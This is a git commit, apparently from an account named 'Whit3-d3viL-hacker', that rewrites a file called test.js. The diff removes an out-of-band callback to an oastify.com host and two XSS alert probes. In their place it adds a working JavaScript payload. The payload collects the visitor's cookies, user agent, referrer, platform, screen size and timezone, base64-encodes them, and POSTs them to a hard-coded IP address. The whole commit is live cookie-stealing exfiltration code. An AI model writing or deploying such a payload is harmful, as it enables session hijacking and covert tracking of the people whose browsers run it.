0381129680df00c7ae1b045364dd41580bf15250
Whit3-d3viL-hacker <160129838+Whit3-d3viL-hacker@users.noreply.github.com>
2025-08-19 17:14:42 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,3 +1,17 @@
-fetch("https://jylrsh1e268ta1mk7j6v4xstokubi16q.oastify.com/log?time=" + Date.now());
-alert(120)
-<script>alert(11)</script>
+(async()=>{
+  const p={
+    ua:navigator.userAgent,
+    lang:navigator.language,
+    plat:navigator.platform,
+    ref:document.referrer,
+    c:document.cookie,
+    scr:[screen.width,screen.height],
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone
+  };
+  const b64=btoa(unescape(encodeURIComponent(JSON.stringify(p))));
+  await fetch("http://56.228.80.85:80/log",{
+    method:"POST",
+    headers:{"Content-Type":"text/plain"},
+    body:b64
+  });
+})();
